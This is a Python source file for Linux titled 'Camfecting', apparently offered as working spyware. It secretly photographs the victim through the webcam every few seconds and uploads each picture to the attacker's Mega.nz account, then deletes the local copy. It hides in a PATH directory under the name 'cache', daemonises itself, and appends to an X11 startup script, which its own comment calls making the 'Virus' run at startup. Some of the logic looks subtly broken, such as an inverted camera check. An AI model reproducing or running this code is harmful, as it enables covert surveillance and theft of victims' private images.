#!/usr/bin/env python3.6
###################
#   Camfecting    #
###################
# ** For Linux System **

from time import ctime, time, sleep
from sys import implementation, platform, argv
from shutil import move
from os import environ, path, mkdir, remove, fork, _exit, EX_OK, chmod
from concurrent.futures import ThreadPoolExecutor as TPPE



####### [*] Start : Upload #######
class Upload(object):
    def __init__(self):
        self.user       = 'Your Email Address' # Your Email in Mega.nz
        self.password   = 'Your Password' # Your Password in Mega.nz
        self.Error      = lambda lib: ImportError(f"Please install \
        {lib} or write\npython3 -m pip install -r requirements.txt ") # Error Import Models
            
    def LoginAndUploadFileTarget(self, file):
        try:
            from mega import Mega
            up = Mega()
        except ImportError:
            raise self.Error("mega.py")
            exit(0)
        try:
            m_login = up.login(
                email=self.user,
                password=self.password
            )
            m_login.upload(file)
            return file
        except Exception:
            print(None)
            exit(0)



####### [*] Start : Camera Capture And Get Image #######
class CameraCaptureAndGetImage(object):
    def __init__(self):
        # Object Upload 
        self.up = Upload()

        # if the target connect in internet 
        try:
            from requests import get

            try: get('https://www.google.com')
            except Exception:
                exit(0)
                
        except ImportError:
            raise self.up.Error("requests")
            exit(0)
        
        # import OpenCV Model 
        try:
            from cv2 import VideoCapture, imwrite
            self.vIm = VideoCapture
            self.wIm = imwrite
        except ImportError:
            raise self.up.Error("cv2")
            exit(0)
        # Number id camera pc 
        self.idCam = None
        for i in range(0, 4):
            try:
                assert self.vIm(i)
                self.idCam = i
            except Exception:
                continue

            break
        # Path Save Images
        lpath = '/tmp/.tmp'
        if not platform.startswith('win'):
            if not path.isdir(lpath): mkdir(lpath)
            self.imPath = lpath
        else: exit(0)
        
        # Number Image 
        self.cou = int()



    def processing(self):
        '''This is Cpu in Script'''
        # Step[1] : get Image
        try_image = self.getImage()
        if try_image.any():
            # Step[2] : Save Image 
            try_save    = self.save(try_image)
            if try_save:
                # Step[3] : Upload Image 
                try_uplaod  = self.up.LoginAndUploadFileTarget(try_save)

                if try_uplaod:
                    # Step[4] : Delete Image
                    self.delete(try_uplaod)

                else:
                    raise Exception("Error For Upload")
                    exit(0)

            else:
                raise Exception("Error For Saving")
                exit(0)

        else:
            raise Exception("Sorry No cmara in Your Capture")
            exit(0)

        
    def getImage(self):
        if not self.idCam:
            cap = self.vIm(self.idCam)
            _, framIm = cap.read()
            return framIm
        else:
            return None

        
    def save(self, *args, **kwargs):
        '''
        param filename
        . @brief Saves an image to a specified file.
        .
        . The function imwrite saves the image to the specified file. The image format is chosen based on the
        . filename extension (see cv::imread for the list of extensions). In general, only 8-bit
        . single-channel or 3-channel (with 'BGR' channel order) images
        . can be saved using this function, with these exceptions:
        '''
        data, *_ = args
        rpath = path.join(self.imPath, f'.{self.cou}-{implementation._multiarch}-{ctime().split()[-2]}-.jpg')
        self.wIm(rpath, data)
        return rpath
    

    def delete(self, *args, **kwargs):
        rpath, *_ = args
        try:
            remove(rpath)
        except Exception: pass
        

    def main(self):
        # Return the current time in seconds since the Epoch.
        # Fractions of a second may be present if 
        # the system clock provides them.
        self.start = time()

        while True:
            self.cou += 1
            self.processing()
            # sleep((0x1000 - 496))  # One Hours
            sleep(5)
            


####### [*] Start : Install #######
class Install(object):
    def __init__(self):
        self.sc = argv[0] # name the script
        # Join two or more pathname components, inserting '/' as needed. 
        self.old = path.join(
            # D.get(k[,d]) -> D[k] if k in D, else d. d defaults to None.
            environ.get('PATH').split(':')[1],
            'cache'
        )

    def getInstall(self):
        if not platform.startswith('win'):
            if path.isfile(self.old): return None
            # Change the access permissions of a file.
            chmod(
                self.sc,
                0x309 
            )
            # Recursively move a file or directory to another location.
            move(
                self.sc,
                self.old
                
            )
            return True



####### [*] Start : Daemon #######
class Daemon:
    def daemon(func):
        def wrapper(*args, **kwargs):
            if fork(): return
            func(*args, **kwargs)
            _exit(EX_OK)
        return wrapper

    def backDaemon():
        path = '/etc/X11/Xsession.d/50x11-common_determine-startup'
        try:
            if 'cache' not in open(path, 'r').read(): open(path, 'a').write('cache')
        except FileNotFoundError:
            exit(0)



####### [*] Start : Script #######
@Daemon.daemon
def main():
    start = CameraCaptureAndGetImage()
    start.main()
    

if __name__ == "__main__":
    # Start Install 
    obj2    = Install()
    if not platform.startswith('win'):
        try_ins = obj2.getInstall()  # Install Tools
        print(try_ins)
        if try_ins:
            Daemon.backDaemon()  # set Virus run startup system

    # Start Script
    main()
    # [+] Listing...
